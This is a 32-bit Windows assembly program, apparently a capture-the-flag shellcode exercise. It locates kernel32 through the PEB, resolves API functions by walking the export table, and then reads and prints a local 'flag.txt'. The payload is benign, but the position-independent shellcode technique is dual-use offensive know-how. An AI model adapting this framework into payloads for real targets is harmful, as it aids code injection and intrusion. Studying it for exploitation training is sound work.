; https://idafchev.github.io/exploit/2017/09/26/writing_windows_shellcode.html
; https://docs.microsoft.com/windows/win32/debug/pe-format

format PE console
use32
entry start

start:
    push ebp
    mov ebp, esp
    sub esp, 0120h
    push ebx
    call _locate_kernel32
    mov [ebp - 04h], eax  ; kernel32 base

    push 00007373h
    push 65726464h
    push 41636f72h
    push 50746547h  ; "GetProcAddress\0"
    mov ebx, esp
    push ebx
    mov eax, [ebp - 04h]
    push eax
    call _locate_function
    add esp, 18h
    mov [ebp - 08h], eax
    
    xor ebx, ebx
    push ebx
    push 656c6946h
    push 6e65704fh  ; "OpenFile\0"
    mov ebx, esp
    push ebx
    mov eax, [ebp - 04h]
    push eax
    mov eax, [ebp - 08h]
    call eax
    add esp, 0ch
    mov [ebp - 0ch], eax
    
    xor ebx, ebx
    push ebx
    push 656c6946h
    push 64616552h  ; "ReadFile\0"
    mov ebx, esp
    push ebx
    mov eax, [ebp - 04h]
    push eax
    mov eax, [ebp - 08h]
    call eax
    add esp, 0ch
    mov [ebp - 10h], eax
    
    push 00000065h
    push 6c694665h
    push 74697257h  ; "WriteFile\0"
    mov ebx, esp
    push ebx
    mov eax, [ebp - 04h]
    push eax
    mov eax, [ebp - 08h]
    call eax
    add esp, 0ch
    mov [ebp - 14h], eax

    xor ebx, ebx
    push ebx
    push 656c646eh
    push 61486474h
    push 53746547h  ; "GetStdHandle\0"
    mov ebx, esp
    push ebx
    mov eax, [ebp - 04h]
    push eax
    mov eax, [ebp - 08h]
    call eax
    add esp, 10h
    mov [ebp - 18h], eax

    push 00000070h
    push 65656c53h  ; "Sleep\0"
    mov ebx, esp
    push ebx
    mov eax, [ebp - 04h]
    push eax
    mov eax, [ebp - 08h]
    call eax
    add esp, 08h
    mov [ebp - 1ch], eax

    push 00737365h
    push 636f7250h
    push 74697845h  ; "ExitProcess\0"
    mov ebx, esp
    push ebx
    mov eax, [ebp - 04h]
    push eax
    mov eax, [ebp - 08h]
    call eax
    add esp, 0ch
    mov [ebp - 20h], eax

    xor ebx, ebx
    push ebx
    push 7478742eh
    push 67616c66h  ; "flag.txt\0"
    mov ebx, esp
    xor eax, eax
    push eax
    lea eax, [ebp - 0120h]  ; lpReOpenBuff, dummy
    push eax
    push ebx
    mov eax, [ebp - 0ch]
    call eax
    add esp, 0ch
    mov [ebp - 0ch], eax  ; file handle
    
    xor ebx, ebx
    push ebx
    push ebx  ; let's just assume that read completes
    push 0100h
    lea eax, [ebp - 0120h]
    push eax
    mov eax, [ebp - 0ch]
    push eax
    mov eax, [ebp - 10h]
    call eax

    push 0fffffff5h
    mov eax, [ebp - 18h]
    call eax
    mov [ebp - 18h], eax  ; GetStdHandle(0xfffffff5)

    xor ebx, ebx
    push ebx
    push ebx  ; let's just assume that write completes
    push 0100h
    lea eax, [ebp - 0120h]
    push eax
    mov eax, [ebp - 18h]
    push eax
    mov eax, [ebp - 14h]
    call eax

    push 03e8h
    mov eax, [ebp - 1ch]
    call eax  ; Sleep(1000)
    
    push 00h
    mov eax, [ebp - 20h]
    call eax  ; ExitProcess(0)

    pop ebx
    leave
    ret

_locate_kernel32:  ; args 0
    push ebx
    push ebp
    mov ebp, esp
    mov ebx, [fs:30h]  ; TEB -> PEB
    mov ebx, [ebx + 0Ch]  ; PEB -> PEB_LDR_DATA
    mov ebx, [ebx + 14h]  ; PEB_LDR_DATA -> LDR_MODULE
    mov ebx, [ebx]
    mov ebx, [ebx]
    mov eax, [ebx + 10h]  ; LDR_MODULE -> BaseAddress
    leave
    pop ebx
    ret

_locate_function:  ; args 2: dll base, function name pointer
    push ebp
    mov ebp, esp
    push ebx
    push ecx
    push edx
    push edi
    push esi
    mov ebx, [ebp + 08h]  ; dll base
    mov ecx, [ebx + 3Ch]  ; RVA of PE Signature
    add ecx, ebx          ; addr of PE Signature
    mov ecx, [ecx + 78h]  ; RVA of Export Table
    add ecx, ebx          ; addr of Export Table
    mov edx, [ecx + 18h]  ; number of entries in name pointer table
    mov edi, [ecx + 20h]  ; RVA of Name Pointer Table
    add edi, ebx          ; addr of Name Pointer Table
    xor esi, esi          ; counter
    xor eax, eax
    .loop:
        cmp esi, edx
        jae .end
        push dword [edi + esi*4]
        add [esp], ebx
        push dword [ebp + 0ch]
        call _strcmp
        add esp, 8h
        test eax, eax
        jz .found
        xor eax, eax
        inc esi
        jmp .loop
    .found:
        mov edi, [ecx + 24h]  ; RVA of Ordinal Table
        add edi, ebx          ; addr of Ordinal Table
        movzx esi, word [edi + esi*2]  ; ordinal number
        mov edi, [ecx + 1Ch]  ; RVA of Address Table
        add edi, ebx          ; addr of Address Table
        mov eax, [edi + esi*4]
        add eax, ebx
    .end:
        pop esi
        pop edi
        pop edx
        pop ecx
        pop ebx
        leave
        ret

_strcmp:  ; args 2: s1, s2
    push ebp
    mov ebp, esp
    push ebx
    push edi
    push esi
    mov edi, [ebp + 08h]
    mov esi, [ebp + 0ch]
    .loop:
        mov al, [edi]
        mov bl, [esi]
        test al, al
        jz .end  ; *s1 == '\0'
        cmp al, bl
        jnz .end ; *s1 != *s2
        inc edi
        inc esi
        jmp .loop
    .end:
        sub al, bl
        movsx eax, al
        pop esi
        pop edi
        pop ebx
        leave
        ret